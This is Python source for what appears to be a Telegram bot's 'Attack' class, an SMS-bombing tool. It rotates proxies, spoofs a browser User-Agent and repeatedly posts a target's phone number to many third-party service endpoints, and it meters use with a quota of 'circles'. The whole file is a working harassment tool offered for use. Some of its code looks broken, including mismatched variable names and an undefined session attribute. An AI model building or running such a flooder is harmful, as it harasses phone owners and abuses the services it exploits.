from random import choice
from asyncio import sleep, get_event_loop
from loguru import logger
from json import loads
from datetime import datetime as dt

from requests import Session
from requests.exceptions import ConnectionError, ReadTimeout, SSLError
from aiogram.types import Message

from objects import globals
from temp.headers import headers
from formats.decode_host import decode_host


@logger.catch
class Attack:
    phone: str
    user_id: int

    def __init__(self, phone="", user_id=None):
        """Initialization

        :param: phone (User phone)
        :type: str
        :param: user_id (User Id)
        :type: int

        """

        self.phone: str = phone
        self.user_id: int = user_id
        self.process_status: bool = True
        self.state_cirlces: int = 0
        self.user_data = None
        self.session: Session = Session()
        self.headers = {"User-Agent": ("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
                                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                                       "Chrome/93.0.4577.63 Safari/537.36")}

    async def start(self, message: Message):
        """Start attack

        :param: message
        :type: Message

        """

        # Get all data sites or services
        self.user_data = await globals.UserData.objects.filter(user_id=self.user_id).all()
        circles_status = self.user_data[0].status

        # Check circles count
        if circles_status == "∞":
            self.state_circles = "∞"
        elif int(circles_status) == 0:
            await globals.bot.delete_message(chat_id=message.chat.id, message_id=message.message_id+1)
            return await message.answer(text="🗑Количество кругов израсходовано!")
        else:
            self.state_circles: int = int(circles_status)

        # Load all proxies
        with open(r"sites/proxies.json") as proxies_load:
            proxies = loads(proxies_load.read())

        # Load all services
        with open(r"sites/services.json") as services_load:
            services = loads(services_load.read())

        # Run attack process
        while self.process_status:
            proxy = choice(list(proxies.keys()))
            proxy_url = {"http": "http://%s:%s@%s" %
                         (proxies[proxy][0], proxies[proxy][1], proxy,)}
            self.session.proxies.update(proxy_url)
            self.session.headers.update(self.headers)

            if self.state_circles != "∞":
                # Update count circles (auto stoping)
                await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
                return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")

            for (k, v) in services.items():
                try:
                    if "data" in v.keys():
                        url = v["url"] % decode_host(k)
                        data = (v["data"] % self.phone).replace("'", "\"")
                        self.session.post(url=url, data=data, timeout=2)
                    elif "json" in v.keys():
                        url = v["url"] % decode_host(k)
                        json = (v["json"] % self.phone).replace("'", "\"")
                        self.session.post(url=url, json=json, timeout=2)
                    else:
                        url = v["url"] % (decode_host(k), self.phone,)  # Url
                        self.session.post(url=url, timeout=2)
                except (ConnectionError, ReadTimeout, UnicodeEncodeError, SSLError):
                    pass

            await sleep(3)  # Time-out
            if circles_status != "∞":
                self.state_circles -= 1

    async def stop(self):
        """Stop attack"""

        # Update count cirlces (handle stoping)
        await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())

        self.process_status = False       # Change process status
        await self.client_session.close()  # Stop process attack
